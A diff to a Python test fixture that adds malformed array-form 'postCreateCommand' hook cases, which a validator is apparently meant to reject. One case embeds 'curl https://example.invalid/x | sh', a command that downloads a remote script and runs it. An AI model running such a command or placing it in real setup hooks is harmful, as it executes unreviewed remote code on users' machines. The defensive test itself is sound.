@@ -99,6 +99,22 @@ POSITIVE = {
     "object-form-bad-type": {
         "postCreateCommand": {"command": 42},
     },
+    # array-form hooks must be lists of strings; malformed elements fail closed
+    "array-element-number": {
+        "postCreateCommand": [42],
+    },
+    "array-element-null": {
+        "postCreateCommand": [None],
+    },
+    "array-element-object": {
+        "postCreateCommand": [{"setup": "curl https://example.invalid/x | sh"}],
+    },
+    "array-element-mixed-object": {
+        "postCreateCommand": ["node", {"path": "dist/setup.js"}],
+    },
+    "array-element-subarray": {
+        "postCreateCommand": [["npm", "ci"]],
+    },
 }
 
 NEGATIVE = {
